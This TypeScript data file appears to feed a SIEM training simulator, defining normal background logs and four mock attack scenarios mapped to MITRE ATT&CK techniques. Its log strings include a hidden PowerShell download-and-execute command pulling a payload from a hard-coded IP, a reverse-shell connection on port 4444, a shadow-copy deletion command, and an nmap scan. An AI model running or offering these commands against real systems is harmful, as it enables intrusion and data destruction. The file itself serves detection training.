import { LogEvent, SimulationScenario } from "../types";

// Base logs that can represent normal network/system activities (background noise)
export const initialLogs: LogEvent[] = [
  {
    id: "b1",
    timestamp: "10:45:01",
    host: "Windows-VM",
    source: "Sysmon",
    severity: "low",
    message: "EventID=11: File created: C:\\Users\\Administrator\\AppData\\Local\\Temp\\scoped_dir_1540_21021\\stable.dat",
    category: "File Activity",
    details: { process: "chrome.exe", filePath: "C:\\Users\\Administrator\\AppData\\Local\\Temp\\stable.dat" }
  },
  {
    id: "b2",
    timestamp: "10:45:15",
    host: "Network-Sensor",
    source: "Zeek",
    severity: "low",
    message: "conn.log: orig=192.168.1.105:54122 resp=172.217.16.142:443 service=ssl duration=2.12s orig_bytes=1045 resp_bytes=4312",
    category: "Network Connection",
    details: { srcIp: "192.168.1.105", dstIp: "172.217.16.142", dstPort: 443 }
  },
  {
    id: "b3",
    timestamp: "10:46:02",
    host: "Kali-VM",
    source: "syslog",
    severity: "low",
    message: "systemd[1]: Started Periodic Command Scheduler.",
    category: "System Log",
    details: { process: "cron" }
  },
  {
    id: "b4",
    timestamp: "10:46:30",
    host: "Windows-VM",
    source: "PowerShell",
    severity: "low",
    message: "EventID=4104: Script block logging: Get-Service -Name SplunkForwarder",
    category: "Execution",
    details: { process: "powershell.exe", command: "Get-Service -Name SplunkForwarder" }
  },
  {
    id: "b5",
    timestamp: "10:47:11",
    host: "Kali-VM",
    source: "auth.log",
    severity: "low",
    message: "sshd[24012]: Accepted publickey for splunk-admin from 192.168.1.10 port 49123 ssh2",
    category: "Authentication",
    details: { srcIp: "192.168.1.10", user: "splunk-admin" }
  },
  {
    id: "b6",
    timestamp: "10:48:02",
    host: "Network-Sensor",
    source: "Suricata",
    severity: "low",
    message: "eve.json: HTTP response 200 OK for /index.html from 192.168.1.100",
    category: "Web Traffic",
    details: { srcIp: "192.168.1.105", dstIp: "192.168.1.100", dstPort: 80 }
  }
];

// Attack Scenarios corresponding to SIEM events that can be dynamically injected
export const scenarios: SimulationScenario[] = [
  {
    id: "recon_scan",
    name: "Nmap Network Reconnaissance Scan",
    description: "An external scan from Kali-VM probing the Windows-VM active ports and service banners to find entry points.",
    icon: "ShieldAlert",
    targetVM: "Kali-VM -> Windows-VM",
    impactRisk: 42,
    steps: [
      "1. Intruder issues stealth SYN scan: nmap -sS -Pn -p- 192.168.1.100",
      "2. Suricata triggers signatures for network sweep and port scan.",
      "3. Zeek records multiple short-lived connections with flags indicating scan probe."
    ],
    logs: [
      {
        host: "Network-Sensor",
        source: "Suricata",
        severity: "medium",
        message: "eve.json: [1:2001201:4] ET SCAN Potential Nmap Scan Outbound",
        mitreId: "T1595.001",
        mitreName: "Active Scanning: IP Addresses Scan",
        category: "Reconnaissance",
        details: { srcIp: "192.168.1.150", dstIp: "192.168.1.100", riskScoreContribution: 10 }
      },
      {
        host: "Network-Sensor",
        source: "Zeek",
        severity: "low",
        message: "conn.log: SYN sweep detected. orig=192.168.1.150 resp=192.168.1.100:22,80,135,445,3389 state=S0 duration=0.00s",
        category: "Network Connection",
        details: { srcIp: "192.168.1.150", dstIp: "192.168.1.100", riskScoreContribution: 5 }
      },
      {
        host: "Network-Sensor",
        source: "Suricata",
        severity: "medium",
        message: "eve.json: [1:2018581:2] ET SCAN suspicious rapid SYN scan to multiple ports",
        mitreId: "T1046",
        mitreName: "Network Service Scanning",
        category: "Reconnaissance",
        details: { srcIp: "192.168.1.150", dstIp: "192.168.1.100", riskScoreContribution: 15 }
      }
    ]
  },
  {
    id: "ssh_bruteforce",
    name: "SSH Brute-Force Authentication Attack",
    description: "A coordinated login dictionary attack against Kali-VM SSH server, ending in an unauthorized access event.",
    icon: "KeyRound",
    targetVM: "Kali-VM (auth.log)",
    impactRisk: 68,
    steps: [
      "1. Threat actor launches dictionary attack targeting the ssh daemon.",
      "2. Linux auth.log registers a flurry of consecutive 'Failed password' messages.",
      "3. Attacker succeeds and logs in, followed immediately by suspicious shell spawning."
    ],
    logs: [
      {
        host: "Kali-VM",
        source: "auth.log",
        severity: "medium",
        message: "sshd[28415]: Failed password for root from 192.168.1.150 port 43100 ssh2",
        mitreId: "T1110.001",
        mitreName: "Brute Force: Password Guessing",
        category: "Credential Access",
        details: { srcIp: "192.168.1.150", user: "root", riskScoreContribution: 10 }
      },
      {
        host: "Kali-VM",
        source: "auth.log",
        severity: "medium",
        message: "sshd[28417]: Failed password for root from 192.168.1.150 port 43104 ssh2",
        mitreId: "T1110.001",
        mitreName: "Brute Force: Password Guessing",
        category: "Credential Access",
        details: { srcIp: "192.168.1.150", user: "root", riskScoreContribution: 10 }
      },
      {
        host: "Kali-VM",
        source: "auth.log",
        severity: "medium",
        message: "sshd[28419]: Failed password for root from 192.168.1.150 port 43108 ssh2",
        mitreId: "T1110.001",
        mitreName: "Brute Force: Password Guessing",
        category: "Credential Access",
        details: { srcIp: "192.168.1.150", user: "root", riskScoreContribution: 10 }
      },
      {
        host: "Kali-VM",
        source: "auth.log",
        severity: "high",
        message: "sshd[28425]: Accepted password for root from 192.168.1.150 port 43112 ssh2",
        mitreId: "T1110.001",
        mitreName: "Brute Force: Password Guessing",
        category: "Initial Access",
        details: { srcIp: "192.168.1.150", user: "root", riskScoreContribution: 25 }
      },
      {
        host: "Kali-VM",
        source: "syslog",
        severity: "high",
        message: "PAM-session: session opened for user root by (uid=0)",
        category: "Privilege Escalation",
        details: { user: "root", riskScoreContribution: 13 }
      }
    ]
  },
  {
    id: "powershell_c2",
    name: "PowerShell C2 Malware Download & Execution",
    description: "An administrator-level PowerShell exploit on Windows-VM downloading an obfuscated payload and starting a reverse shell.",
    icon: "Binary",
    targetVM: "Windows-VM (Sysmon + PowerShell)",
    impactRisk: 88,
    steps: [
      "1. PowerShell executes an obfuscated, hidden window command downloading a remote file.",
      "2. Sysmon EventID 1 catches process creation for powershell.exe with network argument.",
      "3. Sysmon EventID 3 registers a outbound connection from powershell.exe to known malicious C2 IP.",
      "4. Suricata generates high severity alert for suspicious payload download."
    ],
    logs: [
      {
        host: "Windows-VM",
        source: "PowerShell",
        severity: "high",
        message: "EventID=4104: Script block logging: powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://45.55.101.12/payload.ps1')",
        mitreId: "T1059.001",
        mitreName: "Command and Scripting Interpreter: PowerShell",
        category: "Execution",
        details: { process: "powershell.exe", command: "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://45.55.101.12/payload.ps1')", riskScoreContribution: 30 }
      },
      {
        host: "Windows-VM",
        source: "Sysmon",
        severity: "high",
        message: "EventID=1: Process Create: Image=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ParentImage=\"C:\\Windows\\explorer.exe\" CommandLine=\"powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://45.55.101.12/payload.ps1')\"",
        mitreId: "T1204.002",
        mitreName: "User Execution: Malicious File",
        category: "Execution",
        details: { process: "powershell.exe", parentProcess: "explorer.exe", riskScoreContribution: 20 }
      },
      {
        host: "Network-Sensor",
        source: "Suricata",
        severity: "high",
        message: "eve.json: [1:2018903:3] ET POLICY PowerShell Script Inbound Download via HTTP",
        mitreId: "T1105",
        mitreName: "Ingress Tool Transfer",
        category: "Command and Control",
        details: { srcIp: "45.55.101.12", dstIp: "192.168.1.100", dstPort: 80, riskScoreContribution: 25 }
      },
      {
        host: "Windows-VM",
        source: "Sysmon",
        severity: "critical",
        message: "EventID=3: Network Connection: Image=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" DestinationIp=45.55.101.12 DestinationPort=4444 Protocol=tcp Initiate=true",
        mitreId: "T1071.001",
        mitreName: "Application Layer Protocol: Web Protocols",
        category: "Command and Control",
        details: { process: "powershell.exe", srcIp: "192.168.1.100", dstIp: "45.55.101.12", dstPort: 4444, riskScoreContribution: 35 }
      }
    ]
  },
  {
    id: "ransomware_attack",
    name: "Multi-Stage Ransomware Active Deployment",
    description: "A catastrophic attack path executing high-privilege operations to clear backup shadows, encrypt files, and initiate data exfiltration.",
    icon: "Skull",
    targetVM: "Windows-VM + Kali-VM + Network",
    impactRisk: 98,
    steps: [
      "1. Attacker escalates privileges to NT AUTHORITY\\SYSTEM.",
      "2. Shadow copies are forcefully deleted using vssadmin.exe to prevent easy recovery.",
      "3. Malicious binary runs massive file operations changing extensions to .locked.",
      "4. Network exfiltration spikes are logged via Zeek as sensitive databases are copied out."
    ],
    logs: [
      {
        host: "Windows-VM",
        source: "Sysmon",
        severity: "critical",
        message: "EventID=1: Process Create: Image=\"C:\\Windows\\System32\\vssadmin.exe\" CommandLine=\"vssadmin.exe delete shadows /all /quiet\"",
        mitreId: "T1490",
        mitreName: "Inhibit System Recovery",
        category: "Impact",
        details: { process: "vssadmin.exe", command: "vssadmin.exe delete shadows /all /quiet", user: "SYSTEM", riskScoreContribution: 40 }
      },
      {
        host: "Windows-VM",
        source: "Sysmon",
        severity: "critical",
        message: "EventID=11: File Created/Modified: Image=\"C:\\Users\\Public\\ransom.exe\" TargetFilename=\"C:\\Databases\\CustomerDB.db.locked\"",
        mitreId: "T1486",
        mitreName: "Data Encrypted for Impact",
        category: "Impact",
        details: { process: "ransom.exe", filePath: "C:\\Databases\\CustomerDB.db.locked", riskScoreContribution: 45 }
      },
      {
        host: "Network-Sensor",
        source: "Zeek",
        severity: "critical",
        message: "conn.log: High data exfiltration. orig=192.168.1.100 resp=198.51.100.42:5000 service=ssh orig_bytes=521,490,123",
        mitreId: "T1048",
        mitreName: "Exfiltration Over Alternative Protocol",
        category: "Exfiltration",
        details: { srcIp: "192.168.1.100", dstIp: "198.51.100.42", dstPort: 5000, riskScoreContribution: 38 }
      }
    ]
  }
];

// Helper to get active MITRE trigger state
export const getInitialMitreMatrix = (): any[] => {
  return [
    { id: "T1595.001", name: "IP Addresses Scan", tactic: "Reconnaissance", description: "Scanning target networks to identify IP addresses", triggered: false, associatedLogsCount: 0 },
    { id: "T1046", name: "Network Service Scanning", tactic: "Reconnaissance", description: "Probing services on ports to find software version details", triggered: false, associatedLogsCount: 0 },
    { id: "T1110.001", name: "Password Guessing", tactic: "Credential Access", description: "Automated brute-force password attempts against SSH", triggered: false, associatedLogsCount: 0 },
    { id: "T1059.001", name: "PowerShell Scripting", tactic: "Execution", description: "Executing malicious commands via the PowerShell console", triggered: false, associatedLogsCount: 0 },
    { id: "T1204.002", name: "Malicious File Execution", tactic: "Execution", description: "Running executable payloads or downloaded scripts", triggered: false, associatedLogsCount: 0 },
    { id: "T1105", name: "Ingress Tool Transfer", tactic: "Command and Control", description: "Downloading external files onto compromise machines", triggered: false, associatedLogsCount: 0 },
    { id: "T1071.001", name: "Web C2 Protocols", tactic: "Command and Control", description: "Communicating over HTTP/S to external command servers", triggered: false, associatedLogsCount: 0 },
    { id: "T1490", name: "Inhibit System Recovery", tactic: "Impact", description: "Deleting Volume Shadow Copies to prevent database restoration", triggered: false, associatedLogsCount: 0 },
    { id: "T1486", name: "Data Encrypted", tactic: "Impact", description: "Encrypting production assets to demand a ransom", triggered: false, associatedLogsCount: 0 },
    { id: "T1048", name: "Alternative Exfiltration", tactic: "Exfiltration", description: "Tunneling customer databases and secrets to rogue servers", triggered: false, associatedLogsCount: 0 }
  ];
};
